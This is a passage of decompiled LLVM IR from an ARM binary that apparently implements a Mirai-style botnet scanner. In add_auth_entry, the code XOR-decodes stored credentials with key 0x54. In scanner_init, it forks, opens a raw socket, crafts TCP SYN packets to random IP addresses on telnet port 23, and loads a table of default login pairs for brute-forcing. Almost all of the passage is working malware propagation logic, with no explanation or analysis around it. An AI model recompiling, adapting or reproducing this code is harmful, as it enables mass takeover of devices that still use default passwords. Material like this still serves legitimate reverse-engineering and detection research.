  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e290 = call i32 @__libc_connect(i32 %v3_e278, i32 %v2_e1e8, i32 16)
  store i32 %v3_e290, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e294

dec_label_pc_e294:                                ; preds = %entry.dec_label_pc_e294_crit_edge, %dec_label_pc_e224
  %v1_e29c = phi i32 [ %v1_e29c.pre, %entry.dec_label_pc_e294_crit_edge ], [ %v3_e290, %dec_label_pc_e224 ]
  %v2_e298 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e298, i32* @r4, align 4
  store i32 %v6_e1dc, i32* @r5, align 4
  store i32 %v9_e1dc, i32* @r6, align 4
  store i32 %v12_e1dc, i32* @lr, align 4
  ret i32 %v1_e29c

; uselistorder directives
  uselistorder i32 %v3_e214, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e294, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e2a4 = load i32, i32* @r4, align 4
  %v6_e2a4 = load i32, i32* @r5, align 4
  %v9_e2a4 = load i32, i32* @r6, align 4
  %v12_e2a4 = load i32, i32* @r7, align 4
  %v15_e2a4 = load i32, i32* @r8, align 4
  %v18_e2a4 = load i32, i32* @sb, align 4
  %v21_e2a4 = load i32, i32* @sl, align 4
  %v24_e2a4 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_2324c.137 to i32), i32* @fp, align 4
  %v2_e2ac = load i32, i32* @global_var_2324c.137, align 4
  store i32 ptrtoint (i32* @global_var_23278.139 to i32), i32* @sl, align 4
  %v1_e2b8 = add i32 %v2_e2ac, 1
  store i32 %v1_e2b8, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e2c4 = load i32, i32* @global_var_23278.139, align 4
  store i32 %v2_e2c4, i32* %r0.global-to-local, align 4
  %v3_e2c8 = mul i32 %v1_e2b8, 16
  store i32 %v3_e2c8, i32* %r1.global-to-local, align 4
  %v4_e2d0 = inttoptr i32 %v2_e2c4 to i32*
  %v5_e2d0 = call i32 @realloc(i32* %v4_e2d0, i32 %v3_e2c8, i32 %arg3, i32 %v1_e2b8)
  %v2_e2d4 = load i32, i32* @global_var_2324c.137, align 4
  store i32 %v2_e2d4, i32* %r2.global-to-local, align 4
  store i32 %v5_e2d0, i32* @r8, align 4
  %v0_e2dc = load i32, i32* @r5, align 4
  store i32 %v0_e2dc, i32* %r0.global-to-local, align 4
  %v1_e2e4 = load i32, i32* @sl, align 4
  %v2_e2e4 = inttoptr i32 %v1_e2e4 to i32*
  store i32 %v5_e2d0, i32* %v2_e2e4, align 4
  %v1_e2e8 = inttoptr i32 %v0_e2dc to i8*
  %v2_e2e8 = call i32 @util_strlen(i8* %v1_e2e8)
  %sext = mul i32 %v2_e2e8, 16777216
  %v1_e2ec = sdiv i32 %sext, 16777216
  %v2_e2ec = add nsw i32 %v1_e2ec, 1
  store i32 %v2_e2ec, i32* @r4, align 4
  store i32 %v1_e2ec, i32* @r7, align 4
  store i32 %v2_e2ec, i32* @r0, align 4
  %v0_e2f8 = call i32 @malloc()
  store i32 %v0_e2f8, i32* %r0.global-to-local, align 4
  %v0_e2fc = load i32, i32* @r5, align 4
  store i32 %v0_e2fc, i32* %r1.global-to-local, align 4
  %v0_e300 = load i32, i32* @r4, align 4
  store i32 %v0_e300, i32* %r2.global-to-local, align 4
  store i32 %v0_e2f8, i32* %r6.global-to-local, align 4
  %v3_e308 = call i32 @util_memcpy(i32 %v0_e2f8, i32 %v0_e2fc, i32 %v0_e300)
  store i32 %v3_e308, i32* %r0.global-to-local, align 4
  %v0_e30c = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e30c, 1
  %extract.t6 = trunc i32 %v0_e30c to i8
  br i1 %tmp22, label %dec_label_pc_e330, label %dec_label_pc_e314

dec_label_pc_e314:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %dec_label_pc_e318, %dec_label_pc_e314
  %v2_e320 = phi i32 [ %v1_e324, %dec_label_pc_e318 ], [ 0, %dec_label_pc_e314 ]
  %v1_e318 = load i32, i32* %r6.global-to-local, align 4
  %v2_e318 = add i32 %v1_e318, %v2_e320
  %v3_e318 = inttoptr i32 %v2_e318 to i8*
  %v4_e318 = load i8, i8* %v3_e318, align 1
  %v6_e318 = zext i8 %v4_e318 to i32
  %v1_e31c = xor i32 %v6_e318, 84
  store i32 %v1_e31c, i32* %r3.global-to-local, align 4
  %v1_e320 = trunc i32 %v1_e31c to i8
  store i8 %v1_e320, i8* %v3_e318, align 1
  %v0_e324 = load i32, i32* %r2.global-to-local, align 4
  %v1_e324 = add i32 %v0_e324, 1
  store i32 %v1_e324, i32* %r2.global-to-local, align 4
  %v1_e328 = load i32, i32* @r7, align 4
  %v9_e328 = icmp eq i32 %v1_e324, %v1_e328
  br i1 %v9_e328, label %dec_label_pc_e330.loopexit, label %dec_label_pc_e318

dec_label_pc_e330.loopexit:                       ; preds = %dec_label_pc_e318
  %extract.t = trunc i32 %v1_e324 to i8
  br label %dec_label_pc_e330

dec_label_pc_e330:                                ; preds = %dec_label_pc_e330.loopexit, %entry
  %v0_e340.off0 = phi i8 [ %extract.t, %dec_label_pc_e330.loopexit ], [ %extract.t6, %entry ]
  %v2_e330 = load i32, i32* @global_var_2324c.137, align 4
  %v2_e334 = load i32, i32* @global_var_23278.139, align 4
  %v3_e338 = mul i32 %v2_e330, 16
  store i32 %v3_e338, i32* @sb, align 4
  %v2_e33c = add i32 %v2_e334, %v3_e338
  store i32 %v2_e33c, i32* %r2.global-to-local, align 4
  %v3_e340 = add i32 %v2_e33c, 12
  %v4_e340 = inttoptr i32 %v3_e340 to i8*
  store i8 %v0_e340.off0, i8* %v4_e340, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e2d4, i32* %r3.global-to-local, align 4
  %v0_e34c = load i32, i32* %r6.global-to-local, align 4
  %v1_e34c = load i32, i32* @r8, align 4
  %v5_e34c = mul i32 %v2_e2d4, 16
  %v6_e34c = add i32 %v1_e34c, %v5_e34c
  %v7_e34c = inttoptr i32 %v6_e34c to i32*
  store i32 %v0_e34c, i32* %v7_e34c, align 4
  %v2_e350 = load i32, i32* @global_var_23278.139, align 4
  store i32 %v2_e350, i32* @r7, align 4
  %v1_e354 = inttoptr i32 %arg2 to i8*
  %v2_e354 = call i32 @util_strlen(i8* %v1_e354)
  %sext1 = mul i32 %v2_e354, 16777216
  %v1_e358 = sdiv i32 %sext1, 16777216
  %v2_e358 = add nsw i32 %v1_e358, 1
  store i32 %v2_e358, i32* @r4, align 4
  store i32 %v1_e358, i32* @r6, align 4
  store i32 %v2_e358, i32* @r0, align 4
  %v0_e364 = call i32 @malloc()
  store i32 %v0_e364, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e36c = load i32, i32* @r4, align 4
  store i32 %v0_e36c, i32* %r2.global-to-local, align 4
  store i32 %v0_e364, i32* %r5.global-to-local, align 4
  %v3_e374 = call i32 @util_memcpy(i32 %v0_e364, i32 %arg2, i32 %v0_e36c)
  store i32 %v3_e374, i32* %r0.global-to-local, align 4
  %v0_e378 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e378, 1
  %extract.t8 = trunc i32 %v0_e378 to i8
  br i1 %tmp23, label %dec_label_pc_e39c, label %dec_label_pc_e380

dec_label_pc_e380:                                ; preds = %dec_label_pc_e330
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e384

dec_label_pc_e384:                                ; preds = %dec_label_pc_e384, %dec_label_pc_e380
  %v2_e38c = phi i32 [ %v1_e390, %dec_label_pc_e384 ], [ 0, %dec_label_pc_e380 ]
  %v1_e384 = load i32, i32* %r5.global-to-local, align 4
  %v2_e384 = add i32 %v1_e384, %v2_e38c
  %v3_e384 = inttoptr i32 %v2_e384 to i8*
  %v4_e384 = load i8, i8* %v3_e384, align 1
  %v6_e384 = zext i8 %v4_e384 to i32
  %v1_e388 = xor i32 %v6_e384, 84
  store i32 %v1_e388, i32* %r3.global-to-local, align 4
  %v1_e38c = trunc i32 %v1_e388 to i8
  store i8 %v1_e38c, i8* %v3_e384, align 1
  %v0_e390 = load i32, i32* %r2.global-to-local, align 4
  %v1_e390 = add i32 %v0_e390, 1
  store i32 %v1_e390, i32* %r2.global-to-local, align 4
  %v1_e394 = load i32, i32* @r6, align 4
  %v9_e394 = icmp eq i32 %v1_e390, %v1_e394
  br i1 %v9_e394, label %dec_label_pc_e39c.loopexit, label %dec_label_pc_e384

dec_label_pc_e39c.loopexit:                       ; preds = %dec_label_pc_e384
  %extract.t7 = trunc i32 %v1_e390 to i8
  br label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e39c.loopexit, %dec_label_pc_e330
  %v0_e3ac.off0 = phi i8 [ %extract.t7, %dec_label_pc_e39c.loopexit ], [ %extract.t8, %dec_label_pc_e330 ]
  %v2_e39c = load i32, i32* @global_var_2324c.137, align 4
  store i32 %v2_e39c, i32* %r0.global-to-local, align 4
  %v2_e3a0 = load i32, i32* @global_var_23278.139, align 4
  %v3_e3a4 = mul i32 %v2_e39c, 16
  store i32 %v3_e3a4, i32* %r1.global-to-local, align 4
  %v2_e3a8 = or i32 %v3_e3a4, 13
  %v3_e3ac = add i32 %v2_e3a8, %v2_e3a0
  %v4_e3ac = inttoptr i32 %v3_e3ac to i8*
  store i8 %v0_e3ac.off0, i8* %v4_e3ac, align 1
  store i32 ptrtoint (i16** @global_var_2327c.141 to i32), i32* %r4.global-to-local, align 4
  %v2_e3b8 = load i16, i16* bitcast (i16** @global_var_2327c.141 to i16*), align 4
  %v3_e3b8 = zext i16 %v2_e3b8 to i32
  store i32 %v3_e3b8, i32* %lr.global-to-local, align 4
  %v2_e3c0 = load i32, i32* @global_var_23278.139, align 4
  store i32 %v2_e3c0, i32* %r2.global-to-local, align 4
  %v0_e3c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e3c8 = add i32 %v0_e3c8, %v2_e3c0
  store i32 %v2_e3c8, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_2327c.141 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e3d0 = load i32, i32* @sb, align 4
  %v1_e3d0 = load i32, i32* @r7, align 4
  %v2_e3d0 = add i32 %v1_e3d0, %v0_e3d0
  store i32 %v2_e3d0, i32* %ip.global-to-local, align 4
  %v0_e3d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_e3d4 = add i32 %v0_e3d4, 1
  store i32 %v1_e3d4, i32* %r0.global-to-local, align 4
  %v3_e3d8 = add i32 %v2_e3c8, 10
  %v4_e3d8 = inttoptr i32 %v3_e3d8 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_2327c.141 to i32), i32 16), i32 16) to i16), i16* %v4_e3d8, align 2
  %v0_e3dc = load i32, i32* %lr.global-to-local, align 4
  %v1_e3dc = trunc i32 %v0_e3dc to i16
  %v2_e3dc = load i32, i32* %r1.global-to-local, align 4
  %v3_e3dc = add i32 %v2_e3dc, 8
  %v4_e3dc = inttoptr i32 %v3_e3dc to i16*
  store i16 %v1_e3dc, i16* %v4_e3dc, align 2
  %v0_e3e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_e3e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_e3e0 = add i32 %v1_e3e0, 4
  %v3_e3e0 = inttoptr i32 %v2_e3e0 to i32*
  store i32 %v0_e3e0, i32* %v3_e3e0, align 4
  %v1_e3e4 = load i32, i32* @fp, align 4
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i32*
  store i32 %v1_e3d4, i32* %v2_e3e4, align 4
  %v0_e3e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e3e8 = trunc i32 %v0_e3e8 to i16
  %v2_e3e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e3e8 = inttoptr i32 %v2_e3e8 to i16*
  store i16 %v1_e3e8, i16* %v3_e3e8, align 2
  store i32 %v3_e2a4, i32* @r4, align 4
  store i32 %v6_e2a4, i32* @r5, align 4
  store i32 %v9_e2a4, i32* @r6, align 4
  store i32 %v12_e2a4, i32* @r7, align 4
  store i32 %v15_e2a4, i32* @r8, align 4
  store i32 %v18_e2a4, i32* @sb, align 4
  store i32 %v21_e2a4, i32* @sl, align 4
  store i32 %v24_e2a4, i32* @fp, align 4
  ret i32 %v1_e3d4

; uselistorder directives
  uselistorder i32 %v3_e3a4, { 1, 0 }
  uselistorder i32 %v1_e390, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e364, { 1, 0, 2 }
  uselistorder i32 %v3_e338, { 1, 0 }
  uselistorder i32 %v1_e324, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e2f8, { 1, 0, 2 }
  uselistorder i32 %v2_e2d4, { 1, 0, 2 }
  uselistorder i32 %v3_e2c8, { 1, 0 }
  uselistorder i32 %v1_e2b8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v3_e404 = load i32, i32* @r4, align 4
  %v6_e404 = load i32, i32* @r5, align 4
  %v18_e404 = load i32, i32* @sb, align 4
  %v0_e410 = call i32 @__libc_fork()
  store i32 %v0_e410, i32* %r0.global-to-local, align 4
  %v7_e414 = icmp eq i32 %v0_e410, -1
  %. = zext i1 %v7_e414 to i32
  %tmp1365 = icmp slt i32 %v0_e410, 1
  %storemerge1281 = select i1 %tmp1365, i32 %., i32 1
  store i32 %storemerge1281, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_25d6c.143 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e430 = icmp eq i32 %storemerge1281, 0
  store i1 %v2_e430, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e410, i32* @global_var_25d6c.143, align 4
  br i1 %v2_e430, label %dec_label_pc_e4c8, label %dec_label_pc_e43c

dec_label_pc_e43c:                                ; preds = %entry
  store i32 %v3_e404, i32* %r4.global-to-local, align 4
  store i32 %v6_e404, i32* @r5, align 4
  store i32 %v18_e404, i32* @sb, align 4
  ret i32 %v0_e410

dec_label_pc_e4c8:                                ; preds = %entry
  %v0_e4c8 = call i32 @util_local_addr()
  store i32 %v0_e4c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e4c8, i32* @global_var_25d48.57, align 4
  %v1_e4d4 = call i32 @rand_init(i32 %v0_e4c8)
  %v0_e4d8 = load i32, i32* @r4, align 4
  store i32 %v0_e4d8, i32* %r0.global-to-local, align 4
  %v1_e4dc = inttoptr i32 %v0_e4d8 to i32*
  %v2_e4dc = call i32 @__GI_time(i32* %v1_e4dc)
  store i32 ptrtoint (i32* @global_var_23280.135 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e4dc, i32* @global_var_23280.135, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e4f0 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_25d64.147 to i32), i32* %r3.global-to-local, align 4
  %v0_e4f8 = load i32, i32* @r4, align 4
  store i32 %v0_e4f8, i32* %stack_var_-52, align 4
  store i32 %v2_e4f0, i32* @global_var_25d64.147, align 4
  store i32 %v0_e4f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e504.dec_label_pc_e504_crit_edge, %dec_label_pc_e4c8
  %v2_e510 = phi i32 [ %v2_e510.pre, %dec_label_pc_e504.dec_label_pc_e504_crit_edge ], [ %v2_e4f0, %dec_label_pc_e4c8 ]
  %v0_e50c = phi i32 [ %v0_e548, %dec_label_pc_e504.dec_label_pc_e504_crit_edge ], [ %v0_e4f8, %dec_label_pc_e4c8 ]
  store i32 ptrtoint (i32* @global_var_25d64.147 to i32), i32* %r4.global-to-local, align 4
  %v3_e50c = mul i32 %v0_e50c, 256
  store i32 %v3_e50c, i32* %ip.global-to-local, align 4
  store i32 %v2_e510, i32* @lr, align 4
  %v2_e520 = mul i32 %v0_e50c, 288
  %v1_e528 = add i32 %v0_e50c, 1
  store i32 %v1_e528, i32* %r0.global-to-local, align 4
  %v2_e52c = add i32 %v2_e520, %v2_e510
  store i32 %v2_e52c, i32* %r2.global-to-local, align 4
  store i32 %v2_e52c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e540 = add i32 %v2_e52c, 4
  %v3_e540 = inttoptr i32 %v2_e540 to i32*
  store i32 -1, i32* %v3_e540, align 4
  %v0_e544 = load i32, i32* @r5, align 4
  %v1_e544 = load i32, i32* %r1.global-to-local, align 4
  %v2_e544 = add i32 %v1_e544, 12
  %v3_e544 = inttoptr i32 %v2_e544 to i32*
  store i32 %v0_e544, i32* %v3_e544, align 4
  %v0_e548 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e548, i32* %stack_var_-52, align 4
  %v7_e54c = icmp sgt i32 %v1_e528, 255
  br i1 %v7_e54c, label %dec_label_pc_e550, label %dec_label_pc_e504.dec_label_pc_e504_crit_edge

dec_label_pc_e504.dec_label_pc_e504_crit_edge:    ; preds = %dec_label_pc_e504
  %v2_e510.pre = load i32, i32* @global_var_25d64.147, align 4
  br label %dec_label_pc_e504

dec_label_pc_e550:                                ; preds = %dec_label_pc_e504
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_e55c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e55c, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e568 = load i32, i32* @r5, align 4
  store i32 %v0_e568, i32* @r2, align 4
  store i32 %v3_e55c, i32* @global_var_25d68.149, align 4
  store i32 %v3_e55c, i32* @r4, align 4
  %v2_e574 = call i32 @__libc_fcntl(i32 %v3_e55c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e57c = or i32 %v2_e574, 2048
  store i32 %v1_e57c, i32* @r2, align 4
  %v0_e580 = load i32, i32* @r4, align 4
  store i32 %v0_e580, i32* %r0.global-to-local, align 4
  %v2_e584 = call i32 @__libc_fcntl(i32 %v0_e580, i32 4)
  %v2_e588 = ptrtoint i8* %stack_var_-56 to i32
  %v2_e58c = load i32, i32* @global_var_25d68.149, align 4
  store i32 %v2_e58c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e594 = load i32, i32* @r5, align 4
  store i32 %v0_e594, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e59c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e59c, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e5ac = call i32 @__GI_setsockopt(i32 %v2_e58c, i32 %v0_e594, i32 3, i32 %v2_e59c, i32 4)
  store i32 %v5_e5ac, i32* %r0.global-to-local, align 4
  %v1_e5b0 = load i32, i32* @r5, align 4
  %v3_e5b0 = icmp uge i32 %v5_e5ac, %v1_e5b0
  store i1 %v3_e5b0, i1* %cpsr_c.global-to-local, align 1
  %v9_e5b0 = icmp eq i32 %v5_e5ac, %v1_e5b0
  store i1 %v9_e5b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e5b0, label %dec_label_pc_e5b8, label %dec_label_pc_103bc

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e550, %dec_label_pc_103bc, %dec_label_pc_e5b8
  %v0_e5b8 = call i32 @rand_next()
  %v3_e5bc = mul i32 %v0_e5b8, 65536
  store i32 %v3_e5bc, i32* %r0.global-to-local, align 4
  %v3_e5c0 = urem i32 %v0_e5b8, 65536
  store i32 %v3_e5c0, i32* %ip.global-to-local, align 4
  %v1_e5c4 = mul i32 %v0_e5b8, 256
  %v3_e5c8 = and i32 %v1_e5c4, 65280
  %tmp1368 = udiv i32 %v0_e5b8, 256
  %v4_e5cc = urem i32 %tmp1368, 256
  %v5_e5cc = or i32 %v4_e5cc, %v3_e5c8
  store i32 %v5_e5cc, i32* %r3.global-to-local, align 4
  %v2_e5d0 = icmp ugt i32 %v5_e5cc, 1023
  store i1 %v2_e5d0, i1* %cpsr_c.global-to-local, align 1
  %v7_e5d0 = icmp eq i32 %v5_e5cc, 1024
  store i1 %v7_e5d0, i1* %cpsr_z.global-to-local, align 1
  %v3_e5d8 = icmp ult i32 %v5_e5cc, 1022
  br i1 %v3_e5d8, label %dec_label_pc_e5b8, label %dec_label_pc_e5dc

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e5b8
  %v5_e5d4.le = trunc i32 %v0_e5b8 to i16
  %v2_e5e0 = load i8, i8* bitcast (i8** @global_var_23250.151 to i8*), align 4
  %v3_e5e0 = zext i8 %v2_e5e0 to i32
  %v1_e5e4 = and i32 %v3_e5e0, 240
  %v1_e5e8 = or i32 %v1_e5e4, 5
  store i32 %v1_e5e8, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r0.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_23250.151 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_23252.152 to i16*), align 4
  %v0_e608 = call i32 @rand_next()
  %v1_e608 = trunc i32 %v0_e608 to i16
  store i32 %v0_e608, i32* %r0.global-to-local, align 4
  %v3_e610 = load i8, i8* @global_var_23270.155, align 1
  store i32 ptrtoint (i32* @global_var_23264.154 to i32), i32* @fp, align 4
  store i32 ptrtoint (i8** @global_var_23250.151 to i32), i32* @r4, align 4
  %tmp = urem i8 %v3_e610, 16
  %v1_e620 = zext i8 %tmp to i32
  store i16 %v1_e608, i16* bitcast (i32* @global_var_23254.156 to i16*), align 4
  %v1_e628 = or i32 %v1_e620, 80
  store i32 %v1_e628, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_23258.157 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_23259.158 to i8*), align 4
  %v1_e63c = trunc i32 %v1_e628 to i8
  store i8 %v1_e63c, i8* @global_var_23270.155, align 1
  %v4_e640 = sext i16 %v5_e5d4.le to i32
  store i32 %v4_e640, i32* @lr, align 4
  store i32 5888, i32* %ip.global-to-local, align 4
  store i16 5888, i16* @global_var_23266.159, align 2
  store i16 %v5_e5d4.le, i16* bitcast (i32* @global_var_23264.154 to i16*), align 4
  %v0_e650 = call i32 @rand_next()
  %v1_e650 = trunc i32 %v0_e650 to i16
  %v3_e654 = load i8, i8* @global_var_23271.160, align 1
  %v4_e654 = zext i8 %v3_e654 to i32
  %v1_e658 = or i32 %v4_e654, 2
  store i32 %v1_e658, i32* %r3.global-to-local, align 4
  %v1_e65c = trunc i32 %v1_e658 to i8
  store i8 %v1_e65c, i8* @global_var_23271.160, align 1
  store i16 %v1_e650, i16* bitcast (i32* @global_var_23272.161 to i16*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7a0.163 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32* %r0.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e670 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a7a0.163 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a7a8.167 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_e680 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a7a8.167 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a7b0.169 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e690 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a7b0.169 to i32), i32 11)
  store i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32* %r1.global-to-local, align 4
  %v5_e6a0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_e6b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a798.165 to i32), i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), i32* %r1.global-to-local, align 4
  %v5_e6c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a7b0.169 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_e6d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7b8.173 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a7b0.169 to i32), i32 10)
  store i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32* %r1.global-to-local, align 4
  %v5_e6e0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32 14)
  store i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7c8.177 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
